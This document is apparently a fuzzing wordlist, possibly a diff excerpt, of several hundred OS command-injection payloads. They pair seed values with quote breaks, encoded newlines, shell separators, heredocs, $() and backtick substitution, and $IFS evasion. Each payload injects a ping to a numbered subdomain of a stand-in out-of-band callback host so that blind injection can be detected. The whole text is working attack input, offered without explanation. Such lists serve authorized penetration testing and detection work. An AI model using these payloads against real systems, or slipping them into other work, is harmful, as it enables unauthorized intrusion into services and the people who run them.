+foo<<D%0aD%0a`ping  x452.lookup.evilcollab.domain`<<D%0aD%0a
+invvvvv212.org"<<D%0aD%0a`ping  x453.lookup.evilcollab.domain`<<D%0aD%0a"
+invvvvv212.org'<<D%0aD%0a`ping  x454.lookup.evilcollab.domain`<<D%0aD%0a'
+1"<<D%0aD%0a`ping  x455.lookup.evilcollab.domain`<<D%0aD%0a"
+1'<<D%0aD%0a`ping  x456.lookup.evilcollab.domain`<<D%0aD%0a'
+foo"<<D%0aD%0a`ping  x457.lookup.evilcollab.domain`<<D%0aD%0a"
+foo'<<D%0aD%0a`ping  x458.lookup.evilcollab.domain`<<D%0aD%0a'
+invvvvv212.org%0a%0aping		x459.lookup.evilcollab.domain%0a%0a
+1%0a%0aping		x460.lookup.evilcollab.domain%0a%0a
+foo%0a%0aping		x461.lookup.evilcollab.domain%0a%0a
+invvvvv212.org"%0a%0aping		x462.lookup.evilcollab.domain%0a%0a"
+invvvvv212.org'%0a%0aping		x463.lookup.evilcollab.domain%0a%0a'
+1"%0a%0aping		x464.lookup.evilcollab.domain%0a%0a"
+1'%0a%0aping		x465.lookup.evilcollab.domain%0a%0a'
+foo"%0a%0aping		x466.lookup.evilcollab.domain%0a%0a"
+foo'%0a%0aping		x467.lookup.evilcollab.domain%0a%0a'
+invvvvv212.org%0d%0dping		x468.lookup.evilcollab.domain%0d%0d
+1%0d%0dping		x469.lookup.evilcollab.domain%0d%0d
+foo%0d%0dping		x470.lookup.evilcollab.domain%0d%0d
+invvvvv212.org"%0d%0dping		x471.lookup.evilcollab.domain%0d%0d"
+invvvvv212.org'%0d%0dping		x472.lookup.evilcollab.domain%0d%0d'
+1"%0d%0dping		x473.lookup.evilcollab.domain%0d%0d"
+1'%0d%0dping		x474.lookup.evilcollab.domain%0d%0d'
+foo"%0d%0dping		x475.lookup.evilcollab.domain%0d%0d"
+foo'%0d%0dping		x476.lookup.evilcollab.domain%0d%0d'
+invvvvv212.org;ping		x477.lookup.evilcollab.domain;
+1;ping		x478.lookup.evilcollab.domain;
+foo;ping		x479.lookup.evilcollab.domain;
+invvvvv212.org";ping		x480.lookup.evilcollab.domain;"
+invvvvv212.org';ping		x481.lookup.evilcollab.domain;'
+1";ping		x482.lookup.evilcollab.domain;"
+1';ping		x483.lookup.evilcollab.domain;'
+foo";ping		x484.lookup.evilcollab.domain;"
+foo';ping		x485.lookup.evilcollab.domain;'
+invvvvv212.org%26ping		x486.lookup.evilcollab.domain%26
+1%26ping		x487.lookup.evilcollab.domain%26
+foo%26ping		x488.lookup.evilcollab.domain%26
+invvvvv212.org"%26ping		x489.lookup.evilcollab.domain%26"
+invvvvv212.org'%26ping		x490.lookup.evilcollab.domain%26'
+1"%26ping		x491.lookup.evilcollab.domain%26"
+1'%26ping		x492.lookup.evilcollab.domain%26'
+foo"%26ping		x493.lookup.evilcollab.domain%26"
+foo'%26ping		x494.lookup.evilcollab.domain%26'
+invvvvv212.org|ping		x495.lookup.evilcollab.domain|
+1|ping		x496.lookup.evilcollab.domain|
+foo|ping		x497.lookup.evilcollab.domain|
+invvvvv212.org"|ping		x498.lookup.evilcollab.domain|"
+invvvvv212.org'|ping		x499.lookup.evilcollab.domain|'
+1"|ping		x500.lookup.evilcollab.domain|"
+1'|ping		x501.lookup.evilcollab.domain|'
+foo"|ping		x502.lookup.evilcollab.domain|"
+foo'|ping		x503.lookup.evilcollab.domain|'
+invvvvv212.org<<D%0aD%0aping		x504.lookup.evilcollab.domain<<D%0aD%0a
+1<<D%0aD%0aping		x505.lookup.evilcollab.domain<<D%0aD%0a
+foo<<D%0aD%0aping		x506.lookup.evilcollab.domain<<D%0aD%0a
+invvvvv212.org"<<D%0aD%0aping		x507.lookup.evilcollab.domain<<D%0aD%0a"
+invvvvv212.org'<<D%0aD%0aping		x508.lookup.evilcollab.domain<<D%0aD%0a'
+1"<<D%0aD%0aping		x509.lookup.evilcollab.domain<<D%0aD%0a"
+1'<<D%0aD%0aping		x510.lookup.evilcollab.domain<<D%0aD%0a'
+foo"<<D%0aD%0aping		x511.lookup.evilcollab.domain<<D%0aD%0a"
+foo'<<D%0aD%0aping		x512.lookup.evilcollab.domain<<D%0aD%0a'
+invvvvv212.org%0a%0a$(ping		x513.lookup.evilcollab.domain)%0a%0a
+1%0a%0a$(ping		x514.lookup.evilcollab.domain)%0a%0a
+foo%0a%0a$(ping		x515.lookup.evilcollab.domain)%0a%0a
+invvvvv212.org"%0a%0a$(ping		x516.lookup.evilcollab.domain)%0a%0a"
+invvvvv212.org'%0a%0a$(ping		x517.lookup.evilcollab.domain)%0a%0a'
+1"%0a%0a$(ping		x518.lookup.evilcollab.domain)%0a%0a"
+1'%0a%0a$(ping		x519.lookup.evilcollab.domain)%0a%0a'
+foo"%0a%0a$(ping		x520.lookup.evilcollab.domain)%0a%0a"
+foo'%0a%0a$(ping		x521.lookup.evilcollab.domain)%0a%0a'
+invvvvv212.org%0d%0d$(ping		x522.lookup.evilcollab.domain)%0d%0d
+1%0d%0d$(ping		x523.lookup.evilcollab.domain)%0d%0d
+foo%0d%0d$(ping		x524.lookup.evilcollab.domain)%0d%0d
+invvvvv212.org"%0d%0d$(ping		x525.lookup.evilcollab.domain)%0d%0d"
+invvvvv212.org'%0d%0d$(ping		x526.lookup.evilcollab.domain)%0d%0d'
+1"%0d%0d$(ping		x527.lookup.evilcollab.domain)%0d%0d"
+1'%0d%0d$(ping		x528.lookup.evilcollab.domain)%0d%0d'
+foo"%0d%0d$(ping		x529.lookup.evilcollab.domain)%0d%0d"
+foo'%0d%0d$(ping		x530.lookup.evilcollab.domain)%0d%0d'
+invvvvv212.org;$(ping		x531.lookup.evilcollab.domain);
+1;$(ping		x532.lookup.evilcollab.domain);
+foo;$(ping		x533.lookup.evilcollab.domain);
+invvvvv212.org";$(ping		x534.lookup.evilcollab.domain);"
+invvvvv212.org';$(ping		x535.lookup.evilcollab.domain);'
+1";$(ping		x536.lookup.evilcollab.domain);"
+1';$(ping		x537.lookup.evilcollab.domain);'
+foo";$(ping		x538.lookup.evilcollab.domain);"
+foo';$(ping		x539.lookup.evilcollab.domain);'
+invvvvv212.org%26$(ping		x540.lookup.evilcollab.domain)%26
+1%26$(ping		x541.lookup.evilcollab.domain)%26
+foo%26$(ping		x542.lookup.evilcollab.domain)%26
+invvvvv212.org"%26$(ping		x543.lookup.evilcollab.domain)%26"
+invvvvv212.org'%26$(ping		x544.lookup.evilcollab.domain)%26'
+1"%26$(ping		x545.lookup.evilcollab.domain)%26"
+1'%26$(ping		x546.lookup.evilcollab.domain)%26'
+foo"%26$(ping		x547.lookup.evilcollab.domain)%26"
+foo'%26$(ping		x548.lookup.evilcollab.domain)%26'
+invvvvv212.org|$(ping		x549.lookup.evilcollab.domain)|
+1|$(ping		x550.lookup.evilcollab.domain)|
+foo|$(ping		x551.lookup.evilcollab.domain)|
+invvvvv212.org"|$(ping		x552.lookup.evilcollab.domain)|"
+invvvvv212.org'|$(ping		x553.lookup.evilcollab.domain)|'
+1"|$(ping		x554.lookup.evilcollab.domain)|"
+1'|$(ping		x555.lookup.evilcollab.domain)|'
+foo"|$(ping		x556.lookup.evilcollab.domain)|"
+foo'|$(ping		x557.lookup.evilcollab.domain)|'
+invvvvv212.org<<D%0aD%0a$(ping		x558.lookup.evilcollab.domain)<<D%0aD%0a
+1<<D%0aD%0a$(ping		x559.lookup.evilcollab.domain)<<D%0aD%0a
+foo<<D%0aD%0a$(ping		x560.lookup.evilcollab.domain)<<D%0aD%0a
+invvvvv212.org"<<D%0aD%0a$(ping		x561.lookup.evilcollab.domain)<<D%0aD%0a"
+invvvvv212.org'<<D%0aD%0a$(ping		x562.lookup.evilcollab.domain)<<D%0aD%0a'
+1"<<D%0aD%0a$(ping		x563.lookup.evilcollab.domain)<<D%0aD%0a"
+1'<<D%0aD%0a$(ping		x564.lookup.evilcollab.domain)<<D%0aD%0a'
+foo"<<D%0aD%0a$(ping		x565.lookup.evilcollab.domain)<<D%0aD%0a"
+foo'<<D%0aD%0a$(ping		x566.lookup.evilcollab.domain)<<D%0aD%0a'
+invvvvv212.org%0a%0a`ping		x567.lookup.evilcollab.domain`%0a%0a
+1%0a%0a`ping		x568.lookup.evilcollab.domain`%0a%0a
+foo%0a%0a`ping		x569.lookup.evilcollab.domain`%0a%0a
+invvvvv212.org"%0a%0a`ping		x570.lookup.evilcollab.domain`%0a%0a"
+invvvvv212.org'%0a%0a`ping		x571.lookup.evilcollab.domain`%0a%0a'
+1"%0a%0a`ping		x572.lookup.evilcollab.domain`%0a%0a"
+1'%0a%0a`ping		x573.lookup.evilcollab.domain`%0a%0a'
+foo"%0a%0a`ping		x574.lookup.evilcollab.domain`%0a%0a"
+foo'%0a%0a`ping		x575.lookup.evilcollab.domain`%0a%0a'
+invvvvv212.org%0d%0d`ping		x576.lookup.evilcollab.domain`%0d%0d
+1%0d%0d`ping		x577.lookup.evilcollab.domain`%0d%0d
+foo%0d%0d`ping		x578.lookup.evilcollab.domain`%0d%0d
+invvvvv212.org"%0d%0d`ping		x579.lookup.evilcollab.domain`%0d%0d"
+invvvvv212.org'%0d%0d`ping		x580.lookup.evilcollab.domain`%0d%0d'
+1"%0d%0d`ping		x581.lookup.evilcollab.domain`%0d%0d"
+1'%0d%0d`ping		x582.lookup.evilcollab.domain`%0d%0d'
+foo"%0d%0d`ping		x583.lookup.evilcollab.domain`%0d%0d"
+foo'%0d%0d`ping		x584.lookup.evilcollab.domain`%0d%0d'
+invvvvv212.org;`ping		x585.lookup.evilcollab.domain`;
+1;`ping		x586.lookup.evilcollab.domain`;
+foo;`ping		x587.lookup.evilcollab.domain`;
+invvvvv212.org";`ping		x588.lookup.evilcollab.domain`;"
+invvvvv212.org';`ping		x589.lookup.evilcollab.domain`;'
+1";`ping		x590.lookup.evilcollab.domain`;"
+1';`ping		x591.lookup.evilcollab.domain`;'
+foo";`ping		x592.lookup.evilcollab.domain`;"
+foo';`ping		x593.lookup.evilcollab.domain`;'
+invvvvv212.org%26`ping		x594.lookup.evilcollab.domain`%26
+1%26`ping		x595.lookup.evilcollab.domain`%26
+foo%26`ping		x596.lookup.evilcollab.domain`%26
+invvvvv212.org"%26`ping		x597.lookup.evilcollab.domain`%26"
+invvvvv212.org'%26`ping		x598.lookup.evilcollab.domain`%26'
+1"%26`ping		x599.lookup.evilcollab.domain`%26"
+1'%26`ping		x600.lookup.evilcollab.domain`%26'
+foo"%26`ping		x601.lookup.evilcollab.domain`%26"
+foo'%26`ping		x602.lookup.evilcollab.domain`%26'
+invvvvv212.org|`ping		x603.lookup.evilcollab.domain`|
+1|`ping		x604.lookup.evilcollab.domain`|
+foo|`ping		x605.lookup.evilcollab.domain`|
+invvvvv212.org"|`ping		x606.lookup.evilcollab.domain`|"
+invvvvv212.org'|`ping		x607.lookup.evilcollab.domain`|'
+1"|`ping		x608.lookup.evilcollab.domain`|"
+1'|`ping		x609.lookup.evilcollab.domain`|'
+foo"|`ping		x610.lookup.evilcollab.domain`|"
+foo'|`ping		x611.lookup.evilcollab.domain`|'
+invvvvv212.org<<D%0aD%0a`ping		x612.lookup.evilcollab.domain`<<D%0aD%0a
+1<<D%0aD%0a`ping		x613.lookup.evilcollab.domain`<<D%0aD%0a
+foo<<D%0aD%0a`ping		x614.lookup.evilcollab.domain`<<D%0aD%0a
+invvvvv212.org"<<D%0aD%0a`ping		x615.lookup.evilcollab.domain`<<D%0aD%0a"
+invvvvv212.org'<<D%0aD%0a`ping		x616.lookup.evilcollab.domain`<<D%0aD%0a'
+1"<<D%0aD%0a`ping		x617.lookup.evilcollab.domain`<<D%0aD%0a"
+1'<<D%0aD%0a`ping		x618.lookup.evilcollab.domain`<<D%0aD%0a'
+foo"<<D%0aD%0a`ping		x619.lookup.evilcollab.domain`<<D%0aD%0a"
+foo'<<D%0aD%0a`ping		x620.lookup.evilcollab.domain`<<D%0aD%0a'
+invvvvv212.org%0a%0aping$IFS$9x621.lookup.evilcollab.domain%0a%0a
+1%0a%0aping$IFS$9x622.lookup.evilcollab.domain%0a%0a
+foo%0a%0aping$IFS$9x623.lookup.evilcollab.domain%0a%0a
+invvvvv212.org"%0a%0aping$IFS$9x624.lookup.evilcollab.domain%0a%0a"
+invvvvv212.org'%0a%0aping$IFS$9x625.lookup.evilcollab.domain%0a%0a'
+1"%0a%0aping$IFS$9x626.lookup.evilcollab.domain%0a%0a"
+1'%0a%0aping$IFS$9x627.lookup.evilcollab.domain%0a%0a'
+foo"%0a%0aping$IFS$9x628.lookup.evilcollab.domain%0a%0a"
+foo'%0a%0aping$IFS$9x629.lookup.evilcollab.domain%0a%0a'
+invvvvv212.org%0d%0dping$IFS$9x630.lookup.evilcollab.domain%0d%0d
+1%0d%0dping$IFS$9x631.lookup.evilcollab.domain%0d%0d
+foo%0d%0dping$IFS$9x632.lookup.evilcollab.domain%0d%0d
+invvvvv212.org"%0d%0dping$IFS$9x633.lookup.evilcollab.domain%0d%0d"
+invvvvv212.org'%0d%0dping$IFS$9x634.lookup.evilcollab.domain%0d%0d'
+1"%0d%0dping$IFS$9x635.lookup.evilcollab.domain%0d%0d"
+1'%0d%0dping$IFS$9x636.lookup.evilcollab.domain%0d%0d'
+foo"%0d%0dping$IFS$9x637.lookup.evilcollab.domain%0d%0d"
+foo'%0d%0dping$IFS$9x638.lookup.evilcollab.domain%0d%0d'
+invvvvv212.org;ping$IFS$9x639.lookup.evilcollab.domain;
+1;ping$IFS$9x640.lookup.evilcollab.domain;
+foo;ping$IFS$9x641.lookup.evilcollab.domain;
+invvvvv212.org";ping$IFS$9x642.lookup.evilcollab.domain;"
+invvvvv212.org';ping$IFS$9x643.lookup.evilcollab.domain;'
+1";ping$IFS$9x644.lookup.evilcollab.domain;"
+1';ping$IFS$9x645.lookup.evilcollab.domain;'
+foo";ping$IFS$9x646.lookup.evilcollab.domain;"
+foo';ping$IFS$9x647.lookup.evilcollab.domain;'
+invvvvv212.org%26ping$IFS$9x648.lookup.evilcollab.domain%26
+1%26ping$IFS$9x649.lookup.evilcollab.domain%26
+foo%26ping$IFS$9x650.lookup.evilcollab.domain%26
+invvvvv212.org"%26ping$IFS$9x651.lookup.evilcollab.domain%26"
+invvvvv212.org'%26ping$IFS$9x652.lookup.evilcollab.domain%26'
+1"%26ping$IFS$9x653.lookup.evilcollab.domain%26"
+1'%26ping$IFS$9x654.lookup.evilcollab.domain%26'
+foo"%26ping$IFS$9x655.lookup.evilcollab.domain%26"
+foo'%26ping$IFS$9x656.lookup.evilcollab.domain%26'
+invvvvv212.org|ping$IFS$9x657.lookup.evilcollab.domain|
+1|ping$IFS$9x658.lookup.evilcollab.domain|
+foo|ping$IFS$9x659.lookup.evilcollab.domain|
+invvvvv212.org"|ping$IFS$9x660.lookup.evilcollab.domain|"
+invvvvv212.org'|ping$IFS$9x661.lookup.evilcollab.domain|'
+1"|ping$IFS$9x662.lookup.evilcollab.domain|"
+1'|ping$IFS$9x663.lookup.evilcollab.domain|'
+foo"|ping$IFS$9x664.lookup.evilcollab.domain|"
+foo'|ping$IFS$9x665.lookup.evilcollab.domain|'
+invvvvv212.org<<D%0aD%0aping$IFS$9x666.lookup.evilcollab.domain<<D%0aD%0a
+1<<D%0aD%0aping$IFS$9x667.lookup.evilcollab.domain<<D%0aD%0a
+foo<<D%0aD%0aping$IFS$9x668.lookup.evilcollab.domain<<D%0aD%0a
+invvvvv212.org"<<D%0aD%0aping$IFS$9x669.lookup.evilcollab.domain<<D%0aD%0a"
+invvvvv212.org'<<D%0aD%0aping$IFS$9x670.lookup.evilcollab.domain<<D%0aD%0a'
+1"<<D%0aD%0aping$IFS$9x671.lookup.evilcollab.domain<<D%0aD%0a"
+1'<<D%0aD%0aping$IFS$9x672.lookup.evilcollab.domain<<D%0aD%0a'
+foo"<<D%0aD%0aping$IFS$9x673.lookup.evilcollab.domain<<D%0aD%0a"
+foo'<<D%0aD%0aping$IFS$9x674.lookup.evilcollab.domain<<D%0aD%0a'
+invvvvv212.org%0a%0a$(ping$IFS$9x675.lookup.evilcollab.domain)%0a%0a
+1%0a%0a$(ping$IFS$9x676.lookup.evilcollab.domain)%0a%0a
+foo%0a%0a$(ping$IFS$9x677.lookup.evilcollab.domain)%0a%0a
+invvvvv212.org"%0a%0a$(ping$IFS$9x678.lookup.evilcollab.domain)%0a%0a"
+invvvvv212.org'%0a%0a$(ping$IFS$9x679.lookup.evilcollab.domain)%0a%0a'
+1"%0a%0a$(ping$IFS$9x680.lookup.evilcollab.domain)%0a%0a"
+1'%0a%0a$(ping$IFS$9x681.lookup.evilcollab.domain)%0a%0a'
+foo"%0a%0a$(ping$IFS$9x682.lookup.evilcollab.domain)%0a%0a"
+foo'%0a%0a$(ping$IFS$9x683.lookup.evilcollab.domain)%0a%0a'
+invvvvv212.org%0d%0d$(ping$IFS$9x684.lookup.evilcollab.domain)%0d%0d
+1%0d%0d$(ping$IFS$9x685.lookup.evilcollab.domain)%0d%0d
+foo%0d%0d$(ping$IFS$9x686.lookup.evilcollab.domain)%0d%0d
+invvvvv212.org"%0d%0d$(ping$IFS$9x687.lookup.evilcollab.domain)%0d%0d"
+invvvvv212.org'%0d%0d$(ping$IFS$9x688.lookup.evilcollab.domain)%0d%0d'
+1"%0d%0d$(ping$IFS$9x689.lookup.evilcollab.domain)%0d%0d"
+1'%0d%0d$(ping$IFS$9x690.lookup.evilcollab.domain)%0d%0d'
+foo"%0d%0d$(ping$IFS$9x691.lookup.evilcollab.domain)%0d%0d"
+foo'%0d%0d$(ping$IFS$9x692.lookup.evilcollab.domain)%0d%0d'
+invvvvv212.org;$(ping$IFS$9x693.lookup.evilcollab.domain);
+1;$(ping$IFS$9x694.lookup.evilcollab.domain);
+foo;$(ping$IFS$9x695.lookup.evilcollab.domain);
+invvvvv212.org";$(ping$IFS$9x696.lookup.evilcollab.domain);"
+invvvvv212.org';$(ping$IFS$9x697.lookup.evilcollab.domain);'
+1";$(ping$IFS$9x698.lookup.evilcollab.domain);"
+1';$(ping$IFS$9x699.lookup.evilcollab.domain);'
+foo";$(ping$IFS$9x700.lookup.evilcollab.domain);"
+foo';$(ping$IFS$9x701.lookup.evilcollab.domain);'
+invvvvv212.org%26$(ping$IFS$9x702.lookup.evilcollab.domain)%26
+1%26$(ping$IFS$9x703.lookup.evilcollab.domain)%26
+foo%26$(ping$IFS$9x704.lookup.evilcollab.domain)%26
+invvvvv212.org"%26$(ping$IFS$9x705.lookup.evilcollab.domain)%26"
+invvvvv212.org'%26$(ping$IFS$9x706.lookup.evilcollab.domain)%26'
+1"%26$(ping$IFS$9x707.lookup.evilcollab.domain)%26"
+1'%26$(ping$IFS$9x708.lookup.evilcollab.domain)%26'
+foo"%26$(ping$IFS$9x709.lookup.evilcollab.domain)%26"
+foo'%26$(ping$IFS$9x710.lookup.evilcollab.domain)%26'
+invvvvv212.org|$(ping$IFS$9x711.lookup.evilcollab.domain)|
+1|$(ping$IFS$9x712.lookup.evilcollab.domain)|
+foo|$(ping$IFS$9x713.lookup.evilcollab.domain)|
+invvvvv212.org"|$(ping$IFS$9x714.lookup.evilcollab.domain)|"
+invvvvv212.org'|$(ping$IFS$9x715.lookup.evilcollab.domain)|'
+1"|$(ping$IFS$9x716.lookup.evilcollab.domain)|"
+1'|$(ping$IFS$9x717.lookup.evilcollab.domain)|'
+foo"|$(ping$IFS$9x718.lookup.evilcollab.domain)|"
+foo'|$(ping$IFS$9x719.lookup.evilcollab.domain)|'
+invvvvv212.org<<D%0aD%0a$(ping$IFS$9x720.lookup.evilcollab.domain)<<D%0aD%0a
+1<<D%0aD%0a$(ping$IFS$9x721.lookup.evilcollab.domain)<<D%0aD%0a
+foo<<D%0aD%0a$(ping$IFS$9x722.lookup.evilcollab.domain)<<D%0aD%0a
+invvvvv212.org"<<D%0aD%0a$(ping$IFS$9x723.lookup.evilcollab.domain)<<D%0aD%0a"
+invvvvv212.org'<<D%0aD%0a$(ping$IFS$9x724.lookup.evilcollab.domain)<<D%0aD%0a'
+1"<<D%0aD%0a$(ping$IFS$9x725.lookup.evilcollab.domain)<<D%0aD%0a"
+1'<<D%0aD%0a$(ping$IFS$9x726.lookup.evilcollab.domain)<<D%0aD%0a'
+foo"<<D%0aD%0a$(ping$IFS$9x727.lookup.evilcollab.domain)<<D%0aD%0a"
+foo'<<D%0aD%0a$(ping$IFS$9x728.lookup.evilcollab.domain)<<D%0aD%0a'
+invvvvv212.org%0a%0a`ping$IFS$9x729.lookup.evilcollab.domain`%0a%0a
+1%0a%0a`ping$IFS$9x730.lookup.evilcollab.domain`%0a%0a
+foo%0a%0a`ping$IFS$9x731.lookup.evilcollab.domain`%0a%0a
+invvvvv212.org"%0a%0a`ping$IFS$9x732.lookup.evilcollab.domain`%0a%0a"
+invvvvv212.org'%0a%0a`ping$IFS$9x733.lookup.evilcollab.domain`%0a%0a'
+1"%0a%0a`ping$IFS$9x734.lookup.evilcollab.domain`%0a%0a"
+1'%0a%0a`ping$IFS$9x735.lookup.evilcollab.domain`%0a%0a'
+foo"%0a%0a`ping$IFS$9x736.lookup.evilcollab.domain`%0a%0a"
+foo'%0a%0a`ping$IFS$9x737.lookup.evilcollab.domain`%0a%0a'
+invvvvv212.org%0d%0d`ping$IFS$9x738.lookup.evilcollab.domain`%0d%0d
+1%0d%0d`ping$IFS$9x739.lookup.evilcollab.domain`%0d%0d
+foo%0d%0d`ping$IFS$9x740.lookup.evilcollab.domain`%0d%0d
+invvvvv212.org"%0d%0d`ping$IFS$9x741.lookup.evilcollab.domain`%0d%0d"
+invvvvv212.org'%0d%0d`ping$IFS$9x742.lookup.evilcollab.domain`%0d%0d'
+1"%0d%0d`ping$IFS$9x743.lookup.evilcollab.domain`%0d%0d"
+1'%0d%0d`ping$IFS$9x744.lookup.evilcollab.domain`%0d%0d'
+foo"%0d%0d`ping$IFS$9x745.lookup.evilcollab.domain`%0d%0d"
+foo'%0d%0d`ping$IFS$9x746.lookup.evilcollab.domain`%0d%0d'
+invvvvv212.org;`ping$IFS$9x747.lookup.evilcollab.domain`;
+1;`ping$IFS$9x748.lookup.evilcollab.domain`;
+foo;`ping$IFS$9x749.lookup.evilcollab.domain`;
+invvvvv212.org";`ping$IFS$9x750.lookup.evilcollab.domain`;"
+invvvvv212.org';`ping$IFS$9x751.lookup.evilcollab.domain`;'
+1";`ping$IFS$9x752.lookup.evilcollab.domain`;"
+1';`ping$IFS$9x753.lookup.evilcollab.domain`;'
+foo";`ping$IFS$9x754.lookup.evilcollab.domain`;"
+foo';`ping$IFS$9x755.lookup.evilcollab.domain`;'
+invvvvv212.org%26`ping$IFS$9x756.lookup.evilcollab.domain`%26
+1%26`ping$IFS$9x757.lookup.evilcollab.domain`%26
+foo%26`ping$IFS$9x758.lookup.evilcollab.domain`%26
+invvvvv212.org"%26`ping$IFS$9x759.lookup.evilcollab.domain`%26"
+invvvvv212.org'%26`ping$IFS$9x760.lookup.evilcollab.domain`%26'
+1"%26`ping$IFS$9x761.lookup.evilcollab.domain`%26"
+1'%26`ping$IFS$9x762.lookup.evilcollab.domain`%26'
+foo"%26`ping$IFS$9x763.lookup.evilcollab.domain`%26"
+foo'%26`ping$IFS$9x764.lookup.evilcollab.domain`%26'
+invvvvv212.org|`ping$IFS$9x765.lookup.evilcollab.domain`|
+1|`ping$IFS$9x766.lookup.evilcollab.domain`|
+foo|`ping$IFS$9x767.lookup.evilcollab.domain`|
+invvvvv212.org"|`ping$IFS$9x768.lookup.evilcollab.domain`|"
+invvvvv212.org'|`ping$IFS$9x769.lookup.evilcollab.domain`|'
+1"|`ping$IFS$9x770.lookup.evilcollab.domain`|"
+1'|`ping$IFS$9x771.lookup.evilcollab.domain`|'
+foo"|`ping$IFS$9x772.lookup.evilcollab.domain`|"
+foo'|`ping$IFS$9x773.lookup.evilcollab.domain`|'
+invvvvv212.org<<D%0aD%0a`ping$IFS$9x774.lookup.evilcollab.domain`<<D%0aD%0a
+1<<D%0aD%0a`ping$IFS$9x775.lookup.evilcollab.domain`<<D%0aD%0a
+foo<<D%0aD%0a`ping$IFS$9x776.lookup.evilcollab.domain`<<D%0aD%0a
+invvvvv212.org"<<D%0aD%0a`ping$IFS$9x777.lookup.evilcollab.domain`<<D%0aD%0a"
+invvvvv212.org'<<D%0aD%0a`ping$IFS$9x778.lookup.evilcollab.domain`<<D%0aD%0a'
+1"<<D%0aD%0a`ping$IFS$9x779.lookup.evilcollab.domain`<<D%0aD%0a"
+1'<<D%0aD%0a`ping$IFS$9x780.lookup.evilcollab.domain`<<D%0aD%0a'
+foo"<<D%0aD%0a`ping$IFS$9x781.lookup.evilcollab.domain`<<D%0aD%0a"
+foo'<<D%0aD%0a`ping$IFS$9x782.lookup.evilcollab.domain`<<D%0aD%0a'
+invvvvv212.org%0a%0aping  x783.lookup.evilcollab.domain%0a%0ainvvvvv212.org
+1%0a%0aping  x784.lookup.evilcollab.domain%0a%0ainvvvvv212.org
+foo%0a%0aping  x785.lookup.evilcollab.domain%0a%0ainvvvvv212.org
+invvvvv212.org"%0a%0aping  x786.lookup.evilcollab.domain%0a%0ainvvvvv212.org"
+invvvvv212.org'%0a%0aping  x787.lookup.evilcollab.domain%0a%0ainvvvvv212.org'
+1"%0a%0aping  x788.lookup.evilcollab.domain%0a%0ainvvvvv212.org"
+1'%0a%0aping  x789.lookup.evilcollab.domain%0a%0ainvvvvv212.org'
+foo"%0a%0aping  x790.lookup.evilcollab.domain%0a%0ainvvvvv212.org"
+foo'%0a%0aping  x791.lookup.evilcollab.domain%0a%0ainvvvvv212.org'
+invvvvv212.org%0a%0aping  x792.lookup.evilcollab.domain%0a%0a1
+1%0a%0aping  x793.lookup.evilcollab.domain%0a%0a1
+foo%0a%0aping  x794.lookup.evilcollab.domain%0a%0a1
+invvvvv212.org"%0a%0aping  x795.lookup.evilcollab.domain%0a%0a1"
+invvvvv212.org'%0a%0aping  x796.lookup.evilcollab.domain%0a%0a1'
+1"%0a%0aping  x797.lookup.evilcollab.domain%0a%0a1"
+1'%0a%0aping  x798.lookup.evilcollab.domain%0a%0a1'
+foo"%0a%0aping  x799.lookup.evilcollab.domain%0a%0a1"
+foo'%0a%0aping  x800.lookup.evilcollab.domain%0a%0a1'
+invvvvv212.org%0a%0aping  x801.lookup.evilcollab.domain%0a%0afoo
+1%0a%0aping  x802.lookup.evilcollab.domain%0a%0afoo
+foo%0a%0aping  x803.lookup.evilcollab.domain%0a%0afoo
+invvvvv212.org"%0a%0aping  x804.lookup.evilcollab.domain%0a%0afoo"
+invvvvv212.org'%0a%0aping  x805.lookup.evilcollab.domain%0a%0afoo'
+1"%0a%0aping  x806.lookup.evilcollab.domain%0a%0afoo"
+1'%0a%0aping  x807.lookup.evilcollab.domain%0a%0afoo'
+foo"%0a%0aping  x808.lookup.evilcollab.domain%0a%0afoo"
+foo'%0a%0aping  x809.lookup.evilcollab.domain%0a%0afoo'
+invvvvv212.org%0d%0dping  x810.lookup.evilcollab.domain%0d%0dinvvvvv212.org
+1%0d%0dping  x811.lookup.evilcollab.domain%0d%0dinvvvvv212.org
+foo%0d%0dping  x812.lookup.evilcollab.domain%0d%0dinvvvvv212.org
+invvvvv212.org"%0d%0dping  x813.lookup.evilcollab.domain%0d%0dinvvvvv212.org"
+invvvvv212.org'%0d%0dping  x814.lookup.evilcollab.domain%0d%0dinvvvvv212.org'
+1"%0d%0dping  x815.lookup.evilcollab.domain%0d%0dinvvvvv212.org"
+1'%0d%0dping  x816.lookup.evilcollab.domain%0d%0dinvvvvv212.org'
+foo"%0d%0dping  x817.lookup.evilcollab.domain%0d%0dinvvvvv212.org"
+foo'%0d%0dping  x818.lookup.evilcollab.domain%0d%0dinvvvvv212.org'
+invvvvv212.org%0d%0dping  x819.lookup.evilcollab.domain%0d%0d1
+1%0d%0dping  x820.lookup.evilcollab.domain%0d%0d1
+foo%0d%0dping  x821.lookup.evilcollab.domain%0d%0d1
+invvvvv212.org"%0d%0dping  x822.lookup.evilcollab.domain%0d%0d1"
+invvvvv212.org'%0d%0dping  x823.lookup.evilcollab.domain%0d%0d1'
+1"%0d%0dping  x824.lookup.evilcollab.domain%0d%0d1"
+1'%0d%0dping  x825.lookup.evilcollab.domain%0d%0d1'
+foo"%0d%0dping  x826.lookup.evilcollab.domain%0d%0d1"
+foo'%0d%0dping  x827.lookup.evilcollab.domain%0d%0d1'
+invvvvv212.org%0d%0dping  x828.lookup.evilcollab.domain%0d%0dfoo
+1%0d%0dping  x829.lookup.evilcollab.domain%0d%0dfoo
+foo%0d%0dping  x830.lookup.evilcollab.domain%0d%0dfoo
+invvvvv212.org"%0d%0dping  x831.lookup.evilcollab.domain%0d%0dfoo"
+invvvvv212.org'%0d%0dping  x832.lookup.evilcollab.domain%0d%0dfoo'
+1"%0d%0dping  x833.lookup.evilcollab.domain%0d%0dfoo"
+1'%0d%0dping  x834.lookup.evilcollab.domain%0d%0dfoo'
+foo"%0d%0dping  x835.lookup.evilcollab.domain%0d%0dfoo"
+foo'%0d%0dping  x836.lookup.evilcollab.domain%0d%0dfoo'
+invvvvv212.org;ping  x837.lookup.evilcollab.domain;invvvvv212.org
+1;ping  x838.lookup.evilcollab.domain;invvvvv212.org
+foo;ping  x839.lookup.evilcollab.domain;invvvvv212.org
+invvvvv212.org";ping  x840.lookup.evilcollab.domain;invvvvv212.org"
+invvvvv212.org';ping  x841.lookup.evilcollab.domain;invvvvv212.org'
+1";ping  x842.lookup.evilcollab.domain;invvvvv212.org"
+1';ping  x843.lookup.evilcollab.domain;invvvvv212.org'
+foo";ping  x844.lookup.evilcollab.domain;invvvvv212.org"
+foo';ping  x845.lookup.evilcollab.domain;invvvvv212.org'
+invvvvv212.org;ping  x846.lookup.evilcollab.domain;1
